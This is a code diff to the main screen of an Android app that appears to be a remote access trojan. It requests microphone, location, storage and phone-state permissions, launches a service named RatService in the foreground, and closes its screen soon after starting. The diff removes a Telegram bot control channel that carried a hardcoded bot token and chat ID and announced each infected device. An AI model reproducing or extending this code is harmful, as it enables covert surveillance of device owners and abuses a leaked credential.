@@ -18,15 +18,10 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private Handler handler = new Handler();
-    private TelegramBot telegramBot;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // Initialize Telegram Bot
-        telegramBot = new TelegramBot(this, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
-        
         checkPermissions();
     }
 
@@ -41,6 +36,7 @@ public class MainActivity extends AppCompatActivity {
         neededPermissions.add(Manifest.permission.RECORD_AUDIO);
         neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
         neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
@@ -85,7 +81,6 @@ public class MainActivity extends AppCompatActivity {
 
     private void startApp() {
         try {
-            // Start service
             Intent serviceIntent = new Intent(this, RatService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
@@ -95,23 +90,12 @@ public class MainActivity extends AppCompatActivity {
             
             Toast.makeText(this, "✅ Started!", Toast.LENGTH_SHORT).show();
             
-            // Send test message
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    if (telegramBot != null) {
-                        telegramBot.sendMessage("✅ App started on device!");
-                        telegramBot.sendKeyboard();
-                    }
-                }
-            }, 2000);
-            
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     finish();
                 }
-            }, 3000);
+            }, 2000);
             
         } catch (Exception e) {
             e.printStackTrace();
